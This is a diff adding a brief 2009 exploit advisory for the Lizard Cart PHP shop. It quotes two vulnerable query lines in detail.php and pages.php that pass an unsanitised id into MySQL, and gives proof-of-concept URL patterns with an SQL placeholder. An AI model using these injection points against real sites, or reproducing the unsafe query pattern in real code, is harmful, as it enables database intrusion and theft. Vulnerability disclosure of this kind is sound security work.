@@ -1,0 +1,27 @@
+################################################################################
+## Exploit Title: Lizard Cart Multiple SQL Injection Exploit                  ##
+## Date: 20-12-2009                                                           ##
+## Author: cr4wl3r                                                            ##
+## Software Link: http://sourceforge.net/projects/lizardcart/                 ##
+## Version: N/A                                                               ##
+## Tested on: GNU/LINUX                                                       ##
+################################################################################
+
+
+~ Code [detail.php]
+
+$dbResult = mysql_query("select * from products where id='$id'");
+
+~ PoC
+
+[lizardcart_path]/detail.php?id=[SQL]
+
+
+
+~ Code [pages.php]
+
+$dbResult = mysql_query("select * from pages where id='$id'");
+
+~ PoC
+
+[lizardcart_path]/pages.php?id=[SQL]
